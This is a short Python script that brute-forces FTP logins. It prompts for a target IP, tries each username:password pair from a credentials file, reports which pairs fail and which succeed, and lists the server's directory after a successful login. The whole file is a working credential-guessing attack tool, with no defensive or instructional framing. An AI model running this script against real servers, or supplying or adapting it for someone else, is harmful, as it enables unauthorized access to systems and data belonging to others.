from ftplib import FTP
from termcolor import colored
from sys import exit
import time

FTP_CREDENTIALS = 'ftp_credentials.txt'

def login(host):
	ftp = FTP(host)

	with open(FTP_CREDENTIALS, 'r') as file:
		for line in file.read().split('\n'):
			if line != '':
				username, password = line.split(':')
				try:
					ftp.login(username, password)

					print(colored(f'Correct credentials -> {username}:{password}', 'green'))
					print('Listing main directory content')
					ftp.retrlines('LIST')
					ftp.quit()

					break
				except:
					print(colored(f'Incorrect credentials -> {username}:{password}', 'red'))

if __name__ == '__main__':
	host = input('Type the IP target: ')
	login(host)
